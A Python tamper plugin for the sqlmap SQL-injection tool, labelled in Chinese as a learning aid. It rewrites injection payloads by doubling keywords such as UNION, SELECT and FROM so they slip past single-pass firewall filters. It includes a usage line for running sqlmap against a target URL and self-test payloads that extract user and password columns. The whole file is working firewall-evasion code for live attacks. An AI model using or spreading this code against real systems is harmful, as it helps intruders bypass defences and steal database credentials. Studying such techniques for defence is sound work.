#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
double_keywords · sqlmap tamper：关键字双写绕过（学习用）

原理：WAF 做「匹配到关键词就删除/拦截」的单次替换时，
UNION -> UNIunionON，WAF 删除内层 union 后剩下合法的 UNION；
数据库做语法解析，理解它是同一个语义——两层解释器规则不一致处即缝隙。

唯一验收标准：变形后的 SQL 仍能被数据库正确执行（语义等价）。
配合 sqlmap/tamper/ 目录使用：sqlmap -u <url> --tamper=double_keywords.py
"""
try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
except ImportError:
    # 脱离 sqlmap 环境（独立测试/verify.py 导入）时的回退：
    # sqlmap lib/core/enums.py 中 PRIORITY.NORMAL == 4
    __priority__ = 4

KEYWORDS = ("UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "INSERT", "ORDER")


def dependencies():
    """适用环境声明：双写依赖目标数据库对关键词不区分大小写（MySQL 成立）。
    大小写敏感的库请改用本目录的其他脚本。"""
    pass


def _double(word):
    """UNION -> UNI + union + ON（前半原样 + 全小写 + 后半原样）。"""
    mid = len(word) // 2
    return word[:mid] + word.lower() + word[mid:]


def tamper(payload, **kwargs):
    """sqlmap 插件约定：输入原 payload，返回双写变形后的 payload。
    payload 为空时原样返回；URL 编码片段（%xx）不参与替换。"""
    if not payload:
        return payload
    result = payload
    for kw in KEYWORDS:
        out = []
        i = 0
        low = result.lower()
        target = kw.lower()
        while i < len(result):
            hit = low.find(target, i)
            if hit == -1:
                out.append(result[i:])
                break
            # 只替换「裸关键词」：前后不能紧跟字母/数字，避免误伤列名与 %xx 序列
            before_ok = hit == 0 or not (result[hit - 1].isalnum())
            after = hit + len(target)
            after_ok = after >= len(result) or not (result[after].isalnum())
            if before_ok and after_ok:
                out.append(result[i:hit])
                out.append(_double(result[hit:after]))
                i = after
            else:
                out.append(result[i:after])
                i = after
        result = "".join(out)
    return result


if __name__ == "__main__":
    # 独立自测：python double_keywords.py
    cases = ["1 AND 1=1", "1 UNION SELECT user,password FROM users",
             "id=1%20AND%201=2%23", "", "admin"]
    for c in cases:
        print(f"{c!r:55} -> {tamper(c)!r}")
